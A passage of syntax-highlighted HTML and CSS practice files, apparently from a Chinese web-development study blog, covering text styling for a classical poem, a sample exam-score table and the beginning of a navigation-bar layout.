class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">10px</span> auto;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-decoration</span>: underline;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-shadow</span>: <span class=\"number\">2px</span> <span class=\"number\">2px</span> gray;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-family</span>: arial;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-size</span>: <span class=\"number\">3em</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-class\">.one</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-indent</span>: <span class=\"number\">60px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-class\">.two</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-indent</span>: <span class=\"number\">40px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-class\">.three</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-indent</span>: <span class=\"number\">20px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-class\">.four</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-indent</span>: <span class=\"number\">0px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">h3</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"comment\">/* block / inline-block / none */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"comment\">/* display: inline-block; 为none时隐藏不占空间*/</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">visibility</span>: hidden; <span class=\"comment\">/*为hidden时隐藏保留空间*/</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-transform</span>: uppercase;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font</span>: italic bolder <span class=\"number\">2cm</span>/<span class=\"number\">60px</span> <span class=\"string\">&quot;FatDog&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"comment\">/*字体合集属性设定：font:斜体或粗体 加租 大小/行高 &quot;字体名称&quot;*/</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"comment\">/* font-size: 2cm;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\tfont-family: &quot;FatDog&quot;;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\tfont-stretch: extra-expanded;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\tfont-style: oblique; </span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\t</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\tfont: italic bolder 2cm/60px; */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-class\">.box</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: <span class=\"built_in\">rgb</span>(<span class=\"number\">64</span>, <span class=\"number\">128</span>, <span class=\"number\">192</span>);</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">280px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: <span class=\"number\">4px</span> double <span class=\"number\">#00CC33</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border-left-color</span>: blue;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border-right-color</span>: red;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border-radius</span>: <span class=\"number\">10px</span> <span class=\"number\">20px</span> <span class=\"number\">40px</span> <span class=\"number\">80px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">50%</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">50px</span> auto;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">10px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: <span class=\"number\">#749ABE</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-image</span>: <span class=\"built_in\">url</span>(<span class=\"string\">images/443121.jpg</span>);</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-class\">.box</span> <span class=\"selector-tag\">p</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: white;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">40px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">line-height</span>: <span class=\"number\">40px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">10px</span> auto;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#photo</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: <span class=\"number\">10px</span> solid gold;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border-radius</span>: <span class=\"number\">60px</span> <span class=\"number\">60px</span> <span class=\"number\">60px</span> <span class=\"number\">60px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#icon</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background</span>: <span class=\"built_in\">url</span>(<span class=\"string\">images/icons.png</span>) no-repeat no-repeat -<span class=\"number\">530px</span> -<span class=\"number\">280px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: <span class=\"number\">#00FFFF</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#python</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">290px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">82px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-image</span>: <span class=\"built_in\">url</span>(<span class=\"string\">./images/500e42eeab120.jpg</span>);</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: <span class=\"number\">#009966</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;icon&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;python&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;photo&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;images/163057jyrg229qerdeciod.jpg&quot;</span> </span></span><br><span class=\"line\"><span class=\"tag\">\t\t<span class=\"attr\">width</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;100&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h3</span>&gt;</span>hello, world!<span class=\"tag\">&lt;/<span class=\"name\">h3</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;ms&quot;</span>&gt;</span>静夜思<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;box&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;one&quot;</span>&gt;</span>床前明月光<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;two&quot;</span>&gt;</span>疑是地上霜<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;three&quot;</span>&gt;</span>举头望明月<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;four&quot;</span>&gt;</span>低头思故乡<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"表格-html\"><a href=\"#表格-html\" class=\"headerlink\" title=\"表格.html\"></a>表格.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">table</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border-collapse</span>: collapse; <span class=\"comment\">/*合并边框加在表格标签*/</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">td</span>, <span class=\"selector-tag\">th</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid black; <span class=\"comment\">/*设定边框加在单元格*/</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!--ol&gt;li*5&gt;a tab--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!---table&gt;tr*4&gt;td*5 tab 生成一个四行五列的表格--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">table</span>&gt;</span> <span class=\"comment\">&lt;!--border边框--&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">caption</span>&gt;</span>学生考试成绩表<span class=\"tag\">&lt;/<span class=\"name\">caption</span>&gt;</span> <span class=\"comment\">&lt;!--caption标题--&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">thead</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">th</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;120&quot;</span>&gt;</span>姓名<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">th</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100&quot;</span>&gt;</span>语文<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">th</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100&quot;</span>&gt;</span>数学<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">th</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100&quot;</span>&gt;</span>英语<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">th</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100&quot;</span>&gt;</span>体育<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">thead</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">&lt;!--选中一段文字按&#x27;ctrl+]&#x27;可添加上级标签--&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">tbody</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>王大锤<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>90<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>80<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>70<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>60<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>李二狗<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>55<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>56<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>57<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>58<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span> <span class=\"attr\">rowspan</span>=<span class=\"string\">&quot;2&quot;</span>&gt;</span>杨广剑<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span> <span class=\"comment\">&lt;!--跨行--&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span> <span class=\"attr\">colspan</span>=<span class=\"string\">&quot;3&quot;</span> <span class=\"attr\">align</span>=<span class=\"string\">&quot;center&quot;</span>&gt;</span>55<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span> <span class=\"comment\">&lt;!--跨列--&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>90<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">&lt;!--&lt;td&gt;95&lt;/td&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t&lt;td&gt;50&lt;/td&gt; --&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">tbody</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">tfoot</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">tfoot</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"css-practice-1-html\"><a href=\"#css-practice-1-html\" class=\"headerlink\" title=\"css_practice_1.html\"></a>css_practice_1.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Boxes<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t* &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"comment\">/* border: 1px solid black; */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-family</span>: <span class=\"string\">&quot;PT Mono&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#page</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">960px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: <span class=\"number\">4px</span> double black;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span> <span class=\"number\">10px</span> auto;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">padding</span>: <span class=\"number\">20px</span> <span class=\"number\">50px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#logo</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">100%</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#navigation</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">650px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">60px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">20px</span> auto;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border-top</span>: <span class=\"number\">2px</span> solid black;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border-bottom</span>: <span class=\"number\">1px</span> solid black;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#navigation</span>&gt;<span class=\"selector-tag\">li</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">float</span>: left;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">120px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">40px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">list-style-type</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">line-height</span>: <span class=\"number\">40px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">padding-top</span>: <span class=\"number\">10px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#navigation</span>&gt;<span class=\"selector-tag\">li</span>&gt;<span class=\"selector-tag\">a</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-decoration</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: black;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#navigation</span>&gt;<span class=\"selector-tag\">li</span><span class=\"selector-pseudo\">:first</span>-child&gt;<span class=\"selector-tag\">a</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: red;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#navigation</span>&gt;<span class=\"selector-tag\">li</span>&gt;<span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:hover</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: red;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#navigation</span>~<span class=\"selector-tag\">p</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">800px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">20px</span> auto;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;page&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;logo&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;../images/icons/w4.png&quot;</span> <span class=\"attr\">alt</span>=<span class=\"string\">&quot;The Analog Specialists&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;navigation&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;on&quot;</span>&gt;</span>Home<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>For Sale<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span 